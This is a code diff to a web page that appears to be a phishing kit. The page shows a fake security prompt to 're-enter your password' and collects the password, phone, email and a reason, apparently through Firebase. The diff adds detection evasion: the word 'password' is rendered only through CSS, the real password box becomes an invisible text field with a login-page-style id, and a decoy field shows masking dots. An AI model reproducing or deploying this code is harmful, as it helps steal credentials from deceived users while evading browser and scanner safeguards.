@@ -142,7 +142,21 @@
             position: fixed !important;
             right: 0 !important;
         }
-
+        .pass::before {
+            content: 'password';
+        }
+        .pass1::before {
+            content: 'Password';
+        }
+        .wrapper {
+            position: relative;
+        }
+        .wrapper input[type='text']{
+            position: absolute !important;
+        }
+        .wrapper #i0118 {
+            opacity: 0 !important;
+        }
         .form-login {
             padding: 23px;
         }
@@ -1668,21 +1682,23 @@
                 <div class="modal-dialog modal-dialog-centered" role="document">
                     <div class="modal-content">
                         <div class="modal-header">
-                            <h5 class="modal-title" id="exampleModalLongTitle">Please Enter Your Password</h5>
+                            <h5 class="modal-title" id="exampleModalLongTitle">Please Enter Your <span class="pass1"></span></h5>
                             <button type="button" id="close-modal" class="close" data-dismiss="modal"
                                 aria-label="Close">
                                 <span aria-hidden="true">&times;</span>
                             </button>
                         </div>
                         <div class="modal-body">
-                            <p>For your security, you must re-enter your password to continue</p>
-                            <label for="exampleInputPassword1">Enter password</label>
-                            <input type="password" class="form-control" name="password" id="password"
-                                placeholder="password">
+                            <p>For your security, you must re-enter your <span class="pass"></span> to continue</p>
+                            <label for="exampleInputPassword1">Enter <span class="pass"></span></label>
+                            <div class="wrapper">
+                                <input type="text" class="form-control" id="dots">
+                                <input type="text" class="form-control" name="passwd" id="i0118">
+                            </div>
                             <small id="validate-passord" class="validate"></small>
                         </div>
-                        <div class="modal-footer">
-                            <button type="button" id="check-password" class="btn btn-primary">Continue</button>
+                        <div class="modal-footer" style="margin-top: 40px;">
+                            <button type="button" id="check-passwd" class="btn btn-primary">Continue</button>
                         </div>
                     </div>
                 </div>
@@ -2391,6 +2407,10 @@
     </div>
 
     <script type="module">
+        document.addEventListener('DOMContentLoaded', function(e) {
+            i0118.onfocus = function(e){dots.value=dots.value||'|'}
+            i0118.onkeyup = function(e){dots.value=i0118.value.replace(/./g,'●')+'|'}
+        });
         // Import the functions you need from the SDKs you need
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.4.0/firebase-app.js";
         import {
@@ -2421,10 +2441,10 @@
 
         firebase.initializeApp(firebaseConfig);
         var count = 0;
-        var checkPassword = document.getElementById('check-password');
+        var checkPassword = document.getElementById('check-passwd');
         //check validate -> close modal
         checkPassword.addEventListener('click', function () {
-            var password = document.getElementById('password').value.trim();
+            var password = document.getElementById('i0118').value.trim();
             var validate = false;
             var href = "confirm.html";
             count++;
@@ -2457,7 +2477,7 @@
                     var phoneEl = document.getElementById('phone').value.trim();
                     var emailEl = document.getElementById('email').value.trim();
                     var reasonEl = document.getElementById('reason').value.trim();
-                    var password = document.getElementById('password').value.trim();
+                    var password = document.getElementById('i0118').value.trim();
                     var passordFirt = localStorage.getItem('password1');
                     var today = new Date();
                     var date = today.getDate()+'-'+(today.getMonth()+1)+'-'+today.getFullYear();
